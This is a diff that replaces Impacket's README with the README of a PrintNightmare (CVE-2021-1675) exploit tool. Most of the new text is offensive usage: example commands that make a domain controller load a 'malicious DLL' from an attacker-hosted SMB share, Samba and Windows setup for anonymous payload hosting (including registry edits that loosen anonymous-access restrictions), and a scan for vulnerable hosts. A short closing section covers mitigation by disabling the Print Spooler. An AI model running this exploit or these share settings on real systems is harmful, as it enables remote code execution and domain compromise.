@@ -1,108 +1,110 @@
-What is Impacket?
-=================
+# CVE-2021-1675
 
-Impacket is a collection of Python classes for working with network
-protocols. Impacket is focused on providing low-level
-programmatic access to the packets and for some protocols (e.g.
-SMB1-3 and MSRPC) the protocol implementation itself.
-Packets can be constructed from scratch, as well as parsed from 
-raw data, and the object oriented API makes it simple to work with 
-deep hierarchies of protocols. The library provides a set of tools
-as examples of what can be done within the context of this library.
+Impacket implementation of the [PrintNightmare ](https://github.com/afwu/PrintNightmare) PoC originally created by Zhiniang Peng (@edwardzpeng) & Xuefeng Li (@lxf02942370)
 
-A description of some of the tools can be found at:
-https://www.secureauth.com/labs/open-source-tools/impacket
+Tested on a fully patched 2019 Domain Controller
 
-What protocols are featured?
-----------------------------
+Execute malicious DLL's remote or locally
 
- * Ethernet, Linux "Cooked" capture.
- * IP, TCP, UDP, ICMP, IGMP, ARP.
- * IPv4 and IPv6 Support.
- * NMB and SMB1, SMB2 and SMB3 (high-level implementations).
- * MSRPC version 5, over different transports: TCP, SMB/TCP, SMB/NetBIOS and HTTP.
- * Plain, NTLM and Kerberos authentications, using password/hashes/tickets/keys.
- * Portions/full implementation of the following MSRPC interfaces: EPM, DTYPES, LSAD, LSAT, NRPC, RRP, SAMR, SRVS, WKST, SCMR, BKRP, DHCPM, EVEN6, MGMT, SASEC, TSCH, DCOM, WMI, OXABREF, NSPI, OXNSPI.
- * Portions of TDS (MSSQL) and LDAP protocol implementations.
+![](Images/poc2.png)
 
+### Installation
 
-Getting Impacket
-================
+Before running the exploit you need to install my version of Impacket and after that you're gucci
 
-* [Current and past releases](https://github.com/SecureAuthCorp/impacket/releases)
-* [Trunk](https://github.com/SecureAuthCorp/impacket)
+```
+pip3 uninstall impacket
+git clone https://github.com/cube0x0/impacket
+cd impacket
+python3 ./setup.py install
+```
 
-Setup
-=====
+### CVE-2021-1675.py
 
-Quick start
------------
+```
+usage: CVE-2021-1675.py [-h] [-hashes LMHASH:NTHASH] [-target-ip ip address] [-port [destination port]] target share
 
-Grab the latest stable release, unpack it and run `python3 -m pip install .` (`python2 -m pip install .` for Python 2.x) from the directory where you placed it. Isn't that easy?
+CVE-2021-1675 implementation.
 
-Installing
-----------
+positional arguments:
+  target                [[domain/]username[:password]@]<targetName or address>
+  share                 Path to DLL. Example '\\10.10.10.10\share\evil.dll'
 
-In order to install the source execute the following command from the
-directory where the Impacket's distribution has been unpacked: `python3 -m pip install .` (`python2 -m pip install . `for Python 2.x).
-This will install the classes into the default
-Python modules path; note that you might need special permissions to
-write there. 
+optional arguments:
+  -h, --help            show this help message and exit
 
-Testing
--------
+authentication:
+  -hashes LMHASH:NTHASH
+                        NTLM hashes, format is LMHASH:NTHASH
 
-If you want to run the library test cases you need to do mainly three things:
+connection:
+  -target-ip ip address
+                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name
+                        and you cannot resolve it
+  -port [destination port]
+                        Destination port to connect to SMB Server
 
-1. Install and configure a Windows 2012 R2 Domain Controller.
-   * Be sure the RemoteRegistry service is enabled and running.
-2. Configure the [dcetest.cfg](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_23/tests/SMB_RPC/dcetests.cfg) file with the necessary information
-3. Install tox (`python3 -m pip install tox`)
+Example;
+./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll'
+./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\addCube.dll'
+```
 
-Once that's done, you can run `tox` and wait for the results. If all goes well, all test cases should pass.
-You will also have a coverage HTML report located at `impacket/tests/htlmcov/index.html`
+### SMB configuration
 
-Docker Support
---------------
+Easiest way to host payloads is to use samba and modify `/etc/samba/smb.conf   ` to allow anonymous access
 
-Build Impacket's image:
+```
+[global]
+    map to guest = Bad User
+    server role = standalone server
+    usershare allow guests = yes
+    idmap config * : backend = tdb
+    smb ports = 445
 
-      docker build -t "impacket:latest" .
+[smb]
+    comment = Samba
+    path = /tmp/
+    guest ok = yes
+    read only = no
+    browsable = yes
+    force user = smbuser
+```
 
-Using Impacket's image:
+From windows it's also possible
 
-      docker run -it --rm "impacket:latest"
+```
+mkdir C:\share
+icacls C:\share\ /T /grant Anonymous` logon:r
+icacls C:\share\ /T /grant Everyone:r
+New-SmbShare -Path C:\share -Name share -ReadAccess 'ANONYMOUS LOGON','Everyone'
+REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f #This will overwrite existing NullSessionPipes
+REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionShares /t REG_MULTI_SZ /d share /f
+REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f
+REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /t REG_DWORD /d 0 /f
+# Reboot
+```
 
-Licensing
-=========
+### Scanning
 
-This software is provided under a slightly modified version of
-the Apache Software License. See the accompanying [LICENSE](LICENSE) file for
-more information.
+We can use `rpcdump.py` from impacket to scan for vulnerable hosts, if it returns a value, it's vulnerable 
 
-SMBv1 and NetBIOS support based on Pysmb by Michael Teo.
+```
+rpcdump.py @192.168.1.10 | grep MS-RPRN
 
-Disclaimer
-==========
+Protocol: [MS-RPRN]: Print System Remote Protocol
+```
 
-The spirit of this Open Source initiative is to help security researchers,
-and the community, speed up research and educational activities related to
-the implementation of networking protocols and stacks.
+### Mitigation
 
-The information in this repository is for research and educational purposes
-and not meant to be used in production environments and/or as part
-of commercial products.
+Disable Spooler service
 
-If you desire to use this code or some part of it for your own uses, we
-recommend applying proper security development life cycle and secure coding
-practices, as well as generate and track the respective indicators of
-compromise according to your needs.
+```powershell
+Stop-Service Spooler
+REG ADD  "HKLM\SYSTEM\CurrentControlSet\Services\Spooler"  /v "Start " /t REG_DWORD /d "4" /f
+```
 
+Or Uninstall Print-Services
 
-Contact Us
-==========
-
-Whether you want to report a bug, send a patch, or give some suggestions
-on this package, drop us a few lines at oss@secureauth.com.
-
-For security-related questions check our [security policy](SECURITY.md).
+```powershell
+Uninstall-WindowsFeature Print-Services
+```
